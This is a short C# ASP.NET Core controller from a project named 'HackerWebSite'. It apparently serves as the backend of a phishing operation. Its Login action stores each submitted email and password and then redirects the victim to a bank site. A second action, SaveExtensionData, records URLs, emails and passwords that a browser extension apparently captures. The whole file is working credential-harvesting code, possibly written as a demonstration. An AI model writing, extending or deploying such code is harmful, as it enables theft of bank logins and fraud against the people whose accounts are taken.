using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using HackerWebSite.DAL;
using HackerWebSite.Data;
using Microsoft.AspNetCore.Mvc;

// For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace HackerWebSite
{
    [Route("/Account")]
    public class AccountController : Controller
    {
        [HttpPost]
        [Route("Login")]
        public IActionResult Login(string email, string password)
        {
            LoginDTO loginDTO = new LoginDTO() { Email = email, Password = password };
            LoginDAL loginDAL = new LoginDAL();
            loginDAL.PostLoginDetails(loginDTO);
            return Redirect("http://www.banksite.com:84/");

        }

        [HttpPost]
        [Route("SaveExtensionData")]
        public IActionResult SaveExtensionData(string url, string email, string password)
        {
            BrowserExtensionDTO browserExtensionDTO = new BrowserExtensionDTO() { Url = url, Email = email, Password = password };
            LoginDAL loginDAL = new LoginDAL();
            loginDAL.PostBrowserDetails(browserExtensionDTO);
            return Redirect("http://www.banksite.com:84/");

        }
    }
}
